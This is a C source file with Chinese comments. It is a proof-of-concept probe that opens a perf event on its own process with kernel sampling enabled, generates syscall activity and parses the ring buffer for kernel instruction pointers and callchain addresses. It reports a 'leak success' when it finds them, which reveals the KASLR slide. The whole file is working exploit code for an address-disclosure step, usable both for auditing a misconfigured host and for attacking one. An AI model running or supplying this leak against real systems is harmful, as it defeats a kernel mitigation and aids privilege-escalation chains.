/*
 * perf KASLR 泄漏探测
 *
 * 本机 perf_event_paranoid = -1（完全放开）。
 * 目标：确认 perf 采样内核 IP 时是否给出绝对地址（带 KASLR slide）。
 *
 * 方法：
 *   1. perf_event_open() 监控自身进程，采样 PERF_SAMPLE_IP | PERF_SAMPLE_TID
 *   2. 触发内核态执行（read/write syscall）
 *   3. 读 ring buffer，检查 IP 值：
 *      - 若 >= 0xffffff8000000000 → 内核地址，**泄漏成功**
 *      - 若 0x400000-0x7fffff 范围 → 用户态地址
 *      - 若全 0 → 无权限或未采到
 *   4. 额外试 PERF_SAMPLE_CALLCHAIN 拿内核调用栈
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <stdint.h>

static int perf_open(struct perf_event_attr *attr_prefix, pid_t pid, int cpu,
                     int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr_prefix, pid, cpu, group_fd, flags);
}

static int is_kernel(uint64_t ip) {
    return ip >= 0xffffff8000000000ULL;
}

int main(int argc, char **argv) {
    int excl = (argc > 1 && !strcmp(argv[1], "excl"));

    printf("=== perf KASLR 泄漏探测 (excl_kernel=%d) ===\n", excl);

    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 1;          /* 每个事件都采样 */
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
    pe.disabled = 1;
    pe.exclude_kernel = excl ? 1 : 0;
    pe.exclude_hv = 0;
    pe.wakeup_events = 1;

    int fd = perf_open(&pe, 0 /*self*/, -1, -1, 0);
    if (fd < 0) {
        printf("[-] perf_event_open(self): %s (errno=%d)\n", strerror(errno), errno);
        /* 试 cpu=-1 pid=0 不行就试 pid=-1 cpu=0 */
        fd = perf_open(&pe, -1, 0, -1, 0);
        if (fd < 0) {
            printf("[-] perf_event_open(cpu0): %s (errno=%d)\n", strerror(errno), errno);
            return 2;
        }
    }
    printf("[+] perf fd = %d\n", fd);

    size_t pg = sysconf(_SC_PAGESIZE);
    size_t mmap_sz = pg * 9;
    void *base = mmap(NULL, mmap_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (base == MAP_FAILED) {
        printf("[-] mmap: %s\n", strerror(errno));
        close(fd);
        return 3;
    }
    printf("[+] ring buffer mapped %zu bytes\n", mmap_sz);

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    /* 制造内核态活动 */
    char buf[8192];
    int tfd = open("/proc/self/status", O_RDONLY);
    for (int i = 0; i < 3000; i++) {
        if (tfd >= 0) {
            lseek(tfd, 0, SEEK_SET);
            while (read(tfd, buf, sizeof(buf)) > 0) ;
        }
        getpid();
    }
    if (tfd >= 0) close(tfd);

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)base;
    printf("[meta] data_head=%llu data_tail=%llu\n",
           (unsigned long long)meta->data_head, (unsigned long long)meta->data_tail);

    uint64_t head = meta->data_head;
    uint64_t tail = meta->data_tail;
    uint8_t *data = (uint8_t *)base + pg;

    int n_samp = 0, n_kernel = 0, n_user = 0;
    uint64_t first_kernel = 0;
    uint64_t sample_kernels[8];
    int ns = 0;

    while (tail < head && n_samp < 4000) {
        struct perf_event_header *h = (struct perf_event_header *)(data + (tail % mmap_sz));
        if (h->size == 0 || h->size > mmap_sz) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            uint8_t *p = (uint8_t *)h + sizeof(*h);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint32_t pid = *(uint32_t *)p; p += 4;
            uint32_t tid = *(uint32_t *)p; p += 4;
            (void)pid; (void)tid;
            uint64_t nr = *(uint64_t *)p; p += 8;
            n_samp++;
            if (is_kernel(ip)) {
                if (!n_kernel) first_kernel = ip;
                if (ns < 8) sample_kernels[ns++] = ip;
                n_kernel++;
            } else if (ip > 0x1000) {
                n_user++;
            }
            /* callchain 里也可能有内核地址 */
            for (uint64_t i = 0; i < nr && i < 64; i++) {
                uint64_t a = *(uint64_t *)p; p += 8;
                if (is_kernel(a)) {
                    if (!n_kernel) first_kernel = a;
                    if (ns < 8) sample_kernels[ns++] = a;
                    n_kernel++;
                }
            }
        }
        tail += h->size;
    }

    printf("\n=== 结果 ===\n");
    printf("样本数=%d  内核地址=%d  用户地址=%d\n", n_samp, n_kernel, n_user);
    if (n_kernel) {
        printf("!! 内核地址泄漏成功\n");
        for (int i = 0; i < ns; i++)
            printf("   0x%016llx\n", (unsigned long long)sample_kernels[i]);
        printf("\nVERDICT: PERF_LEAK_KERNEL_IP  (slide = ip - 链接地址)\n");
    } else {
        printf("VERDICT: NO_KERNEL_IP\n");
        if (n_samp == 0) printf("  (样本为 0：采样未生效或被拦)\n");
        else printf("  (有样本但无内核地址：exclude_kernel 生效或内核 IP 被过滤)\n");
    }

    munmap(base, mmap_sz);
    close(fd);
    return n_kernel ? 0 : 10;
}